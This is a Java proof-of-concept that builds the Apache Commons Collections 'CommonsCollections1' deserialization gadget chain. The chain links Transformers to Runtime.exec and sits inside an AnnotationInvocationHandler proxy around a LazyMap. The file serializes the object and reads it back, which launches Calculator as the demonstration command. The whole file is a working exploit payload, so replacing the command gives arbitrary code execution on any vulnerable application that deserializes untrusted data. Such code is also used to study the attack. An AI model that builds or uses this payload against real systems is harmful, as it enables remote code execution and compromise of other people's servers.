import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.annotation.Generated;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1_2 {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
        ChainedTransformer chains = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,null}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"open -a Calculator.app"}
                )
        });

        Map lazymap =  LazyMap.decorate(new HashMap(),chains);

        //AnnotationInvocationHandler
        Class<?> cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = cl.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class,lazymap);

        Map mapPorxy = (Map) Proxy.newProxyInstance(
                LazyMap.class.getClassLoader(),
                LazyMap.class.getInterfaces(),
                handler
        );
        /*
        mapProxy被代理

        */

        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Generated.class,mapPorxy);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("CommonsCollections1.2.bin"));
        objectOutputStream.writeObject(invocationHandler);

        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("CommonsCollections1.2.bin"));
        objectInputStream.readObject();

    }
}
